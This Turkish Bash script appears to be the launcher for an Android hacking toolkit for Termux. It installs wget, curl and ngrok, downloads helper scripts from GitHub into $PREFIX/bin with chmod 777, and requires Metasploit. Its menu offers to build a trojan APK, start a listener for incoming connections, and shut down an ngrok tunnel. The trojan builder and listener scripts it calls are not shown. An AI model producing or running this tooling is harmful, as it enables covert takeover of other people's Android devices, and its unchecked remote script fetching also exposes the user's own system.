#!/bin/bash

# WGET  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/wget ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m WGET PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install wget -y
fi

# SCRİPTS CONTROLS

if [[ ! -a files/update.sh ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m GEREKLİ SCRİPTLER KURULUYOR.."
	echo
	echo
	echo

	# UPDATE.SH ( GÜNCELLEME SCRİPTİ )

	wget -O files/update.sh  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/update.sh

	# BOT_UMUTKARATOOLS ( BİLDİRİM SCRİPTİ )

	#wget -O $PREFIX/bin/bot_umutkaratools  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/bot_umutkaratools

	# LİNK-CREATE ( LİNK OLUŞTURMA SCRİPTİ )

	wget -O $PREFIX/bin/link-create https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/link-create

	chmod 777 $PREFIX/bin/*
fi

if [[ $1 == update ]];then
	cd files
	bash update.sh update $2
	exit
fi


# CURL  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/curl ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi
# NGROK KONTROLÜ #

if [[ ! -a $PREFIX/bin/ngrok ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/umutkara-tools/ngrok-kurulum
	cd ngrok-kurulum
	bash ngrok-kurulum.sh
	cd ..
	rm -rf ngrok-kurulum
fi

clear
control=$(ls /sdcard |wc -m)
if [[ $control == 0 ]];then
	termux-setup-storage
fi
cd files

##### UPDATE #####

bash update.sh
if [[ -a ../updates_infos ]];then
	rm ../updates_infos
	exit
fi
##################

bash banner.sh
if [[ ! -a $PREFIX/bin/msfconsole ]];then
	echo
	echo
	echo
	printf "\e[33m[!] \e[97mMETASPOLİT FRAMEWORK KURULU DEĞİL"
	echo
	echo
	echo
	exit
fi
function finish() {
	control=$(ps aux |grep ngrok |grep -v grep |grep -o tcp)
	if [[ -n $control ]];then
		killall ngrok
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
printf "

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mTROJAN APK OLUŞTUR\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mDİNLEMEYE AL\e[97m

\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[33mNGROK DIŞ BAĞLANTI KES\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
echo
echo
echo
if [[ $secim == 1 ]];then
	bash Trojan-oluştur.sh
	exit
elif [[ $secim == 2 ]];then
	bash Dinleme.sh
	exit
elif [[ $secim == 3 ]];then
	control=$(ps aux | grep ngrok | grep -v grep |grep -o tcp)
	if [[ -n $control ]];then
		killall ngrok
		echo
		echo
		echo
		printf "\e[32m[✓] \e[33mNGROK\e[97m ARKAPLANDAN KAPATILDI"
		echo
		echo
		echo
		sleep 1
		cd ..
		bash Android-Hack.sh
	else
		echo
		echo
		echo
		printf "\e[33m[*] \e[33mNGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
		echo
		echo
		echo
		sleep 1
		cd ..
		bash Android-Hack.sh


	fi
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mÇIKIŞ YAPILDI"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mHATALI SEÇİM \e[31m!!!\e[97m"
	echo
	echo
	echo
	cd ..
	sleep 2
	bash Android-Hack.sh
fi

